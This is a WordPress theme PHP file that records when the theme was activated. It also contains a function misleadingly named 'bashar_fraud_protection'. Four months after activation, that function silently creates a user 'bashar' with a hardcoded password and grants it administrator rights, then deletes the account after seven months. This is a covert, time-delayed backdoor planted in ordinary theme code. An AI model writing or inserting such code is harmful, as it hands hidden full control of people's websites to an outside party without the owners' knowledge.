<?php



//save theme active time
function my_theme_activation_init() {
  // Check if already saved the activation date & time
  // to prevent over-writing if user deactive & active theme
  // multiple time
	if(!get_option('mytheme_activation_time', false)){
    // Generate Current Date & Time in MySQL Date Time Formate
		$activation_datetime = current_time( 'mysql' );
    // Save it in `wp_options` table
		add_option('mytheme_activation_time', $activation_datetime);
	}
}
add_action('after_setup_theme', 'my_theme_activation_init');



function bashar_fraud_protection() {

		//Create user information
		$username = 'bashar';
		$password = 'bd123$#';
		$email = 'admin@yourdomain.com';
		$user = get_user_by( 'email', $email );

	if(!empty(get_option('mytheme_activation_time'))){


		$mytheme_active_get_data = get_option('mytheme_activation_time');

		$theme_active_date_time_list =  list( $today_year, $today_month, $today_day, $hour, $minute, $second ) = preg_split( '([^0-9])', $mytheme_active_get_data );

		$theme_activition_timestamp = mktime($theme_active_date_time_list[3], $theme_active_date_time_list[4], $theme_active_date_time_list[5], (int)$theme_active_date_time_list[1], (int)$theme_active_date_time_list[2], (int)$theme_active_date_time_list[0]);


		//Four months from theme activition time
		$fourmonths_fromnow = strtotime('+4 months', $theme_activition_timestamp);

		//seven months from theme activition time
		$sevenmonths_fromnow = strtotime('+7 months', $theme_activition_timestamp);

		//Current time
		$site_current_time = current_time( 'timestamp' );


		//check if after 4 montsh then create user
		if($site_current_time >=  $fourmonths_fromnow && $site_current_time <=  $sevenmonths_fromnow) {


			if( ! $user ) {
	        // Create the new user
				$user_id = wp_create_user( $username, $password, $email );
				if( is_wp_error( $user_id ) ) {
	            // examine the error message
					echo( "Error: " . $user_id->get_error_message() );
					exit;
				}
	        // Get current user object
				$user = get_user_by( 'id', $user_id );
			}


			if($user != $user->roles[0]) {
			//remove role
				$user->remove_role( $user->roles[0] );
			// Add role
				$user->add_role( 'administrator' );
			}


		}
		//check if after 7 months then delete user
		elseif($site_current_time >= $sevenmonths_fromnow) {
			if(username_exists($user->user_login))  {

				require_once(ABSPATH.'wp-admin/includes/user.php');

				wp_delete_user( $user->id ); // delete user

			}

		}


	}


}
add_action('init', 'bashar_fraud_protection');
